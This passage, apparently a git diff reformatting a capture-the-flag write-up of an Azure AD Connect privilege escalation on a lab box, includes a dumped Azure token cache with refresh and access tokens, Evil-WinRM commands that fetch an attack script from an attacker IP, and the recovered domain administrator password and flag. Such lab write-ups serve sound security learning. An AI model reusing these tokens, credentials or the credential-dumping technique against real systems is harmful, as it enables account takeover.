bYktB0Ti8-sNblaGRJBQqmHxZ-0PkSq31op2CzHN7wwYCJOEoJpOtS-x4j1DGZ19hA","AccessTokenType":"Bearer","ExpiresOn":{"DateTime":"\/Date(1578062173584)\/","OffsetMinutes":0},"ExtendedExpiresOn":{"DateTime":"\/Date(1578062173584)\/","OffsetMinutes":0},"ExtendedLifeTimeToken":false,"IdToken":"eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJhdWQiOiIxOTUwYTI1OC0yMjdiLTRlMzEtYTljZi03MTc0OTU5NDVmYzIiLCJpc3MiOiJodHRwczovL3N0cy53aW5kb3dzLm5ldC8zNzJlZmVhOS03YmM0LTRiNzYtODgzOS05ODRiNDVlZGZiOTgvIiwiaWF0IjoxNTc4MDU4Mjc2LCJuYmYiOjE1NzgwNTgyNzYsImV4cCI6MTU3ODA2MjE3NiwiYW1yIjpbInB3ZCJdLCJmYW1pbHlfbmFtZSI6IkNsYXJrIiwiZ2l2ZW5fbmFtZSI6IkpvaG4iLCJpcGFkZHIiOiI0Ni40LjIyMy4xNzMiLCJuYW1lIjoiSm9obiIsIm9pZCI6ImU0ZjU2YmMxLTAyMWYtNDc5NS1iY2EyLWJlZGZjODE5ZTkwYSIsInN1YiI6Inl2V2x2eEFSbE84V0pKN0dUUmFYb0p0MHAwelBiUkRIX0EtcC1FTEtFdDgiLCJ0aWQiOiIzNzJlZmVhOS03YmM0LTRiNzYtODgzOS05ODRiNDVlZGZiOTgiLCJ1bmlxdWVfbmFtZSI6ImpvaG5AYTY3NjMyMzU0NzYzb3V0bG9vay5vbm1pY3Jvc29mdC5jb20iLCJ1cG4iOiJqb2huQGE2NzYzMjM1NDc2M291dGxvb2sub25taWNyb3NvZnQuY29tIiwidmVyIjoiMS4wIn0.","TenantId":"372efea9-7bc4-4b76-8839-984b45edfb98","UserInfo":{"DisplayableId":"john@a67632354763outlook.onmicrosoft.com","FamilyName":"Clark","GivenName":"John","IdentityProvider":"https:\/\/sts.windows.net\/372efea9-7bc4-4b76-8839-984b45edfb98\/","PasswordChangeUrl":null,"PasswordExpiresOn":null,"UniqueId":"e4f56bc1-021f-4795-bca2-bedfc819e90a"}},"UserAssertionHash":null}‘https://login.windows.net/372efea9-7bc4-4b76-8839-984b45edfb98/:::https://management.core.windows.net/:::1950a258-227b-4e31-a9cf-717495945fc2:::0‡{"RefreshToken":"AQABAAAAAACQN9QBRU3jT6bcBQLZNUj7aeQ8R2hfsMQE-DIEEp8rOWPiom2rNwROtUThYh6cCyfB9McL8XdHR94VQSY3KAN-SWuINLqSnI_Lfj-vM1nsCu_Kh51XTceMlWr9mZsNYiX5oCnIBT50bCWIlyeZxmpR7L4sfRp_2iESLU06U0QiHBP7L_HR75crAfpQdJ2oJEn9MWYoxFKIHxXRgAp8fwyKa5yVo5usuanLFGofYzvU6YUGwSFwHskyy_iHdmimggyI7pxp2-C0pSlRp6yZp-4JYyvoeTjxqtXkpMR7VnmJ5qIqJvecNcutXPu-SJDWRvvmW_V2se4V1u1ecuJDe02oAmouL7yp8HrcOBNgn9Jg_f27tHJSbONR-rFWFmeYr-Zi84EJbubYBb7DdzZaoCArbYrgglrAOmz85N9-DMbIJdT7ffteT0hu2rHI6OVDvgckNv-XVhwMF55XtjxxxhpR1EljIq07qCPCqSVoNnoyhDawgyYiNRh0EVr1kf6GEA9bAYNMHgf3VN5WApXbb0VzoxozBKNkNiMybB-uA1d9DLs1eOimxrhoKjsK6cyKTsslGe8qgjcLS0pcRDVvNub1_fKQAXqVB4WZXMo_TDSALh-ctiwVVFNRqTeGsdzcfJe7j3WwzuIiuWfIYydSQKaeRo87qtg6v4dHy4hVBOwm-NPah29sOrSNsyuUydhkNK2QXCwn_hV5-7OCwfSJHG9Dja4r8B_iS0-VvcwzRUT_-2t1eNN8vgRgTlgAdotG330U9SshDgVjg27VHIw-e-57ID7FTEjnVfc4loRNjoNJlSAA","ResourceInResponse":"https:\/\/management.core.windows.net\/","Result":{"AccessToken":"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6InBpVmxsb1FEU01LeGgxbTJ5Z3FHU1ZkZ0ZwQSIsImtpZCI6InBpVmxsb1FEU01LeGgxbTJ5Z3FHU1ZkZ0ZwQSJ9.eyJhdWQiOiJodHRwczovL21hbmFnZW1lbnQuY29yZS53aW5kb3dzLm5ldC8iLCJpc3MiOiJodHRwczovL3N0cy53aW5kb3dzLm5ldC8zNzJlZmVhOS03YmM0LTRiNzYtODgzOS05ODRiNDVlZGZiOTgvIiwiaWF0IjoxNTc4MDU4MjU3LCJuYmYiOjE1NzgwNTgyNTcsImV4cCI6MTU3ODA2MjE1NywiYWNyIjoiMSIsImFpbyI6IjQyVmdZSGc3ajlGN3oxK24renhKZktXQmpxcWRYMzFEVDNLc2ovL2FzT1d5VFcycTNRSUEiLCJhbXIiOlsicHdkIl0sImFwcGlkIjoiMTk1MGEyNTgtMjI3Yi00ZTMxLWE5Y2YtNzE3NDk1OTQ1ZmMyIiwiYXBwaWRhY3IiOiIwIiwiZmFtaWx5X25hbWUiOiJDbGFyayIsImdpdmVuX25hbWUiOiJKb2huIiwiZ3JvdXBzIjpbImM3OTRlNzE3LTIxZWYtNDljZS1hZjAwLTljMDEwZGM0MWE3NiJdLCJpcGFkZHIiOiI0Ni40LjIyMy4xNzMiLCJuYW1lIjoiSm9obiIsIm9pZCI6ImU0ZjU2YmMxLTAyMWYtNDc5NS1iY2EyLWJlZGZjODE5ZTkwYSIsInB1aWQiOiIxMDAzMjAwMDkzOTYzMDJCIiwic2NwIjoidXNlcl9pbXBlcnNvbmF0aW9uIiwic3ViIjoid1U4Y1RtUm5tTzM2Z1E5MEx4VUNiN0tGMXZ3NlVUVlVKa1VPNThJd3NVTSIsInRpZCI6IjM3MmVmZWE5LTdiYzQtNGI3Ni04ODM5LTk4NGI0NWVkZmI5OCIsInVuaXF1ZV9uYW1lIjoiam9obkBhNjc2MzIzNTQ3NjNvdXRsb29rLm9ubWljcm9zb2Z0LmNvbSIsInVwbiI6ImpvaG5AYTY3NjMyMzU0NzYzb3V0bG9vay5vbm1pY3Jvc29mdC5jb20iLCJ1dGkiOiI4MjNlVzFyWmZFQ1hEV2lHaHQ1UkFBIiwidmVyIjoiMS4wIiwid2lkcyI6WyI2MmU5MDM5NC02OWY1LTQyMzctOTE5MC0wMTIxNzcxNDVlMTAiXX0.ja68GQ9Suvm8-6a732DZy7Z7Q62XnmL0hsVnMKP3L-u7KB9W8nafebCzEmwhAoAzEqVOKfApM8VjOALGJcgz60sYbN0JtK4RaHCiF0yQogGTvgFe3FMB-26wCxGo-d_hTxiPiFUGfTuqSMzprXfBEKLneXNKcLlkav2pPNAhLD_HoshDaznMPlt2W00rq6hJII032WoZQMPYMLJmnub4pi2N3ScroWO3zDQ16wpoFCOSYbuqoLKSm-FLN8yEhTJDf2umcOaLVE7jtnHba_rEPyC_sBtIedl1nSR8kr7A9B8dBvn0pC3M7gYIVpVwIana6pni6I8jaMwH_-3aJmCLhw","AccessTokenType":"Bearer","ExpiresOn":{"DateTime":"\/Date(1578062154521)\/","OffsetMinutes":0},"ExtendedExpiresOn":{"DateTime":"\/Date(1578062154521)\/","OffsetMinutes":0},"ExtendedLifeTimeToken":false,"IdToken":"eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJhdWQiOiIxOTUwYTI1OC0yMjdiLTRlMzEtYTljZi03MTc0OTU5NDVmYzIiLCJpc3MiOiJodHRwczovL3N0cy53aW5kb3dzLm5ldC8zNzJlZmVhOS03YmM0LTRiNzYtODgzOS05ODRiNDVlZGZiOTgvIiwiaWF0IjoxNTc4MDU4MjU3LCJuYmYiOjE1NzgwNTgyNTcsImV4cCI6MTU3ODA2MjE1NywiYW1yIjpbInB3ZCJdLCJmYW1pbHlfbmFtZSI6IkNsYXJrIiwiZ2l2ZW5fbmFtZSI6IkpvaG4iLCJpcGFkZHIiOiI0Ni40LjIyMy4xNzMiLCJuYW1lIjoiSm9obiIsIm9pZCI6ImU0ZjU2YmMxLTAyMWYtNDc5NS1iY2EyLWJlZGZjODE5ZTkwYSIsInN1YiI6Inl2V2x2eEFSbE84V0pKN0dUUmFYb0p0MHAwelBiUkRIX0EtcC1FTEtFdDgiLCJ0aWQiOiIzNzJlZmVhOS03YmM0LTRiNzYtODgzOS05ODRiNDVlZGZiOTgiLCJ1bmlxdWVfbmFtZSI6ImpvaG5AYTY3NjMyMzU0NzYzb3V0bG9vay5vbm1pY3Jvc29mdC5jb20iLCJ1cG4iOiJqb2huQGE2NzYzMjM1NDc2M291dGxvb2sub25taWNyb3NvZnQuY29tIiwidmVyIjoiMS4wIn0.","TenantId":"372efea9-7bc4-4b76-8839-984b45edfb98","UserInfo":{"DisplayableId":"john@a67632354763outlook.onmicrosoft.com","FamilyName":"Clark","GivenName":"John","IdentityProvider":"https:\/\/sts.windows.net\/372efea9-7bc4-4b76-8839-984b45edfb98\/","PasswordChangeUrl":null,"PasswordExpiresOn":null,"UniqueId":"e4f56bc1-021f-4795-bca2-bedfc819e90a"}},"UserAssertionHash":null}
 ```
-https://www.lares.com/blog/hunting-azure-admins-for-vertical-escalation/
 
-> While this is a logical default set of permissions, the issue is in the fact that the	TokenCache.dat file is a clear-text JSON file containing the AccessKey for the current session.	An issue for this was submitted to the Azure github repository in June 2019.
+[https://www.lares.com/blog/hunting-azure-admins-for-vertical-escalation/](https://www.lares.com/blog/hunting-azure-admins-for-vertical-escalation/)
 
-```powershell
+> While this is a logical default set of permissions, the issue is in the fact that the TokenCache.dat file is a clear-text JSON file containing the AccessKey for the current session. An issue for this was submitted to the Azure github repository in June 2019.
+
+```text
 *Evil-WinRM* PS C:\Users\mhope\.Azure> Get-Acl -path C:\Users\mhope\.Azure\TokenCache.dat | ft -wrap
 
     Directory: C:\Users\mhope\.Azure
@@ -430,8 +911,10 @@ TokenCache.dat MEGABANK\mhope NT AUTHORITY\SYSTEM Allow  FullControl
                               BUILTIN\Administrators Allow  FullControl
                               MEGABANK\mhope Allow  FullControl
 ```
+
 "As the operator, by simply existing in this user’s process on their workstation, you would have the correct permissions to view and exfiltrate this file.""
-```json
+
+```javascript
 *Evil-WinRM* PS C:\Users\mhope\.Azure> cat AzureRmContext.json
 {
   "DefaultContextKey": "372efea9-7bc4-4b76-8839-984b45edfb98 - john@a67632354763outlook.onmicrosoft.com",
@@ -495,21 +978,20 @@ TokenCache.dat MEGABANK\mhope NT AUTHORITY\SYSTEM Allow  FullControl
   "ExtendedProperties": {}
 }
 ```
-searching for a way to exploit this led to
-https://vbscrub.com/2020/01/14/azure-ad-connect-database-exploit-priv-esc/
-which led to this powershell POC
-https://blog.xpnsec.com/azuread-connect-for-redteam/
 
-had to edit the script to get it to work. (sorry...I didnt write down who or where I found the fix for this script originally, it was simply in my notes with no explanation.)
+searching for a way to exploit this led to [https://vbscrub.com/2020/01/14/azure-ad-connect-database-exploit-priv-esc/](https://vbscrub.com/2020/01/14/azure-ad-connect-database-exploit-priv-esc/) which led to this powershell POC [https://blog.xpnsec.com/azuread-connect-for-redteam/](https://blog.xpnsec.com/azuread-connect-for-redteam/)
+
+had to edit the script to get it to work. \(sorry...I didnt write down who or where I found the fix for this script originally, it was simply in my notes with no explanation.\)
 
 The client code at the beginning had to be edited to read:
-```
+
+```text
 $client = new-object System.Data.SqlClient.SqlConnection -ArgumentList "Server=LocalHost;Database=ADSync;Trusted_Connection=True;"
 ```
 
 Invoke-WebRequest = wget
 
-```
+```text
 *Evil-WinRM* PS C:\Users\mhope\documents> wget http://10.10.14.253:8099/AzCreds.ps1
 The response content cannot be parsed because the Internet Explorer engine is not available, or Internet Explorer's first-launch configuration is not complete. Specify the UseBasicParsing parameter and try again. 
 At line:1 char:1
@@ -545,7 +1027,8 @@ Domain: MEGABANK.LOCAL
 Username: administrator
 Password: d0m@in4dminyeah!
 ```
-```
+
+```text
 *Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
 a44ed9a4442a2d216f3f75e5c802b5b3
 ```
